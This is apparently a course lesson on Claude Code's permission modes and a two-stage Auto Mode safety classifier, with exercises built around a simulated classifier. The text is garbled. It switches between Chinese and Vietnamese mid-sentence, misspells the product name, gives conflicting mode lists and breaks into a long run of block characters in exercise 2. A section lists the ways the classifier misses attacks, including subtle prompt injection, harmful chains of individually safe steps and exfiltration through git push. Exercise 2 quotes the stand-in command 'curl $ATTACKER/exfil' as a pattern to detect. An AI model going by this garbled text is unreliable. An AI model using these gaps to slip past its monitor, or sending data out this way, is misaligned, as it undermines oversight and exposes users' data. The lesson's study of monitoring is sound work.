# 作为自主代理的Cloed Code:权限模式与自动模式

> Claude Code  tiết lộ bảy loại quyền hạn mô hình. "kế hoạch" 会在每个动作前询问, "默认" chỉ sẽ đối với có风险的动作询问, " chấp nhậnEdits" 会 tự động phê duyệt文件写入,但仍会确认 shell 执行, "bypassPermissions" 会批准一切──Auto Mode(2026年3月24日) sử dụng hai giai đoạn đồng hành trình phân loại an toàn 取代 từng động phê duyệt: mỗi động sẽ chạy một mã chỉ 快速检查; được đánh dấu hoạt động sẽ khởi động chuỗi suy nghĩ kiểm duyệt sâu hơn――动作预算通过`max_turns`和 `max_budget_usd`强制执行──Auto Mode 以研究预览 形式发布Anthropic 已明确表示,classifier 单独使用并不足──

**类型：**Học tập
**语言：**Python(stdlib,两阶段 phân loại mô phỏng)
**先修要求：**Giai đoạn 15 · 01(Các tác nhân đường dài),Giai đoạn 15 · 09(Tình cảnh tác nhân mã hóa)
**时间：**45 phút

## 问题

Cơ quan lập mã tự trị trên máy tính của bạn là một loại an ninh độc lập. Nhận thức tấn công là cơ quan này có thể truy cập mọi thứ. Hệ thống tệp, mạng, tín dụng, bảng ghi nhớ, bất kỳ tab trình duyệt nào, bất kỳ thiết bị mở nào. Bruce Schneier và những người khác đã công khai cho thấy điều này: Cơ quan sử dụng máy tính không phải là một lần cập nhật chức năng của chatbot, mà là một công cụ mới, có một hình ảnh mới.

Hệ thống quyền hạn của Claude Code là câu trả lời của Anthropic. Nó không phải là một hệ thống tự trị / không tự trị, mà là một hệ thống có khả năng tạo thành các mô hình khác nhau.

Vấn đề kỹ thuật là: hệ thống này có thể nắm bắt được gì, sẽ bỏ lỡ gì, và một nhiệm vụ nhất định nên sử dụng mô hình nào?

## 概念

### 七种权限模式

| 模式 | 行为 | 使用场景 |
|---|---|---|
| `plan` | Agent 提出计划；用户批准整个计划；每个动作在执行前都会被审查 | 不熟悉的任务；接近 prod 的代码；第一次在某个 repo 上使用 agent |
| `default` | Agent 运行动作；对任何“有风险”的动作提示用户（shell exec、destructive operations、network calls） | 大多数交互式 coding sessions |
| `acceptEdits` | 文件写入自动批准；shell exec 和 network calls 仍然提示 | 跨很多文件的 refactoring pass |
| `acceptExec` | shell commands 在经过整理的 allowlist 内自动批准；写入自动批准 | 紧密 inner loops，其中每个 shell command 都是 `npm test` 或类似命令 |
| `autoMode` | 两阶段 safety classifier；被标记的动作提升为审查 | 受限 workspace 中的 long-horizon unattended runs |
| `yolo` | 跳过大多数提示；仍然运行 tool allowlist / denylist | 临时 sandboxes、CI jobs、research scripts |
| `bypassPermissions` | 批准一切 | 文档说明为“只在你愿意丢弃的 ephemeral containers 内使用” |

(上面的名称与公开 Claude Code docs 一致;"yolo" là cái tên không chính thức của một người trung lưu cho phép.

### Một trang hiểu chế độ tự động

Auto Mode (tiếp tục phát hành vào ngày 24 tháng 3 năm 2026) là mô hình đầu tiên được cấp quyền để phê duyệt động tác.

1. **Stage 1 — single-token classifier。**Trong mỗi động tác được đề xuất, hoạt động trên. chi phí thấp. Trở về "an toàn" hoặc "bộ cờ".
2. **Stage 2 — secondary policy/safety review。**Chỉ hoạt động trên động tác được đánh dấu. Cung quanh động tác này, phiên hiện tại và tuyên bố nhiệm vụ thực hiện chính sách tập trung và đánh giá an toàn. Nếu độ tin cậy thấp, thì nâng cấp lên HITL của người dùng.

预算 kiểm soát và phân loại không có:

- `max_turns` Một phiên Trung ương tổng 代次数──
- `max_budget_usd` 触发 phiên 中止的美元上限──
- Mỗi công cụ của động tác số lần giới hạn (ví dụ: không quá N lần)`WebFetch`gọi) 

### 系统能抓什么

- Các đầu vào công cụ Trung trực tiếp tiêm nhanh, trong đó tiêm chỉ thị được hiển thị đến hình thức động tác có nguy cơ đã biết.
- 重复 công cụ vòng lặpclassifier có thể thấy hành động N+1 với hành động N 连续五次几乎相同──
- Trong phiên tập tin, có những lệnh shell rõ ràng trên phạm vi.

### Hệ thống có thể bỏ lỡ gì

- **微妙的 prompt injection**, nó sẽ điều chỉnh hành vi, nhưng sẽ không tạo ra một động tác được đánh dấu.
- **语义层面的不当行为。**Mỗi động tác độc lập có vẻ là an toàn, nhưng quỹ đạo kết hợp được tạo ra là có hại.
- **通过合法渠道 exfiltration。**Đăng dữ liệu vào tài liệu mà bạn có, rồi `git push`Đến nơi công cộng, có một loạt các động tác, nhưng vấn đề nằm trong sự kết hợp của chúng.

### Xem trước nghiên cứu 定位

Anthropic 将 Auto Mode 作为研究预览发布.文档明确说明,classifier 是一层防护,而不是完整解决方案:用户应将 Auto Mode 与预算,allowists,隔离工作空间和轨迹审计 (Phương pháp học 1216) 结合使用.Preview 定位也反映了已记录的评估-vs.部署差距.

### Đây là một bậc thang trong quá trình làm việc của bạn.

- nhiệm vụ không quen thuộc: từ `plan`开始──阅读计划 比回滚一次糟运行更便宜──
- 已知 Refactor:`acceptEdits`能省下大量确认点击──
- Không giám sát background run: chỉ khi bạn đã đo trên bán kính của vụ nổ trong không gian làm việc`autoMode`(Không có giấy chứng nhận, không có sản xuất, không có sự ra đi của bạn chưa có chủ động chọn)
- Các container Ephemeral: khi và chỉ khi container  và các chứng chỉ của nó là bỏ đi,`yolo`- `bypassPermissions`才可接受.


```figure
autonomy-oversight
```

## Sử dụng nó

`code/main.py`模拟两阶段分类器. 阶段 1 là quy tắc từ khóa giá rẻ của các động cơ được đề xuất; giai đoạn 2 là một trình xem xét nhiều quy tắc chậm hơn. 司机 输入一段简短的合成轨迹.

## 交付 nó

`outputs/skill-permission-mode-picker.md`Sẽ mô tả nhiệm vụ phù hợp với mô hình quyền hạn chính xác, giới hạn ngân sách và sự tách biệt cần thiết.

## 练习

1. 运行 `code/main.py` loại hành động tổng hợp nào không được đánh dấu ở giai đoạn 1, nhưng luôn bị bắt ở giai đoạn 2.

2. 扩展 Stage 1 quy tắc tập hợp, để bắt một hình dạng xấu được biết đến cụ thể`curl $ATTACKER/exfil`(■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■

3. 阅读 Anthropic's "Làm thế nào vòng lặp đại lý hoạt động" 文档――列出 đại lý 在 `default`模式下默认触碰的每种外部状态――在无监督运行`autoMode`Trước, những gì cần một cửa riêng biệt?

4. 设计一个 24 小时 không giám sát ngân sách:`max_turns``max_budget_usd`、per-tool caps、allowlists──说明每个数字的理由──

5. Mô tả một quỹ đạo: trong đó mỗi đơn lẻ động tác đều được phê duyệt giai đoạn 1 và giai đoạn 2, nhưng các hành vi kết hợp lại không phù hợp.

## 关键术语

| 术语 | 人们常说 | 实际含义 |
|---|---|---|
| 权限模式 | “agent 能做多少事” | 控制逐动作批准的七种命名 policy 之一 |
| plan mode | “做任何事前都询问” | Agent 编写计划；用户在执行前批准 |
| acceptEdits | “让它写文件” | 文件写入自动批准；shell exec 仍然提示 |
| autoMode | “自动批准” | 两阶段 safety classifier；被标记的动作会升级 |
| bypassPermissions | “Full YOLO” | 批准一切；预期用于 ephemeral containers |
| Stage 1 classifier | “Fast token check” | 针对拟议动作的 single-token rule；并行运行 |
| Stage 2 classifier | “Deep review” | 对被标记动作进行 chain-of-thought reasoning |
| Research preview | “Not GA” | Anthropic 对 failure mode 仍在被映射的功能所使用的定位 |

## 延伸阅读

- [Anthropic — How the agent loop works](https://code.claude.com/docs/en/agent-sdk/agent-loop) 权限模式、预算、行动格式──
- [Anthropic — Claude Managed Agents overview](https://platform.claude.com/docs/en/managed-agents/overview) quản lý dịch vụ 执行模型。
- [Anthropic — Claude Code product page](https://www.anthropic.com/product/claude-code) bề mặt tính năng với thông báo chế độ tự động.
- [Anthropic — Claude's Constitution (January 2026)](https://www.anthropic.com/news/claudes-constitution) 塑造分类器 判断的基于理性的层──
- [Anthropic — Measuring agent autonomy in practice](https://www.anthropic.com/research/measuring-agent-autonomy) 关于 长视界许可设计 的内部视角──
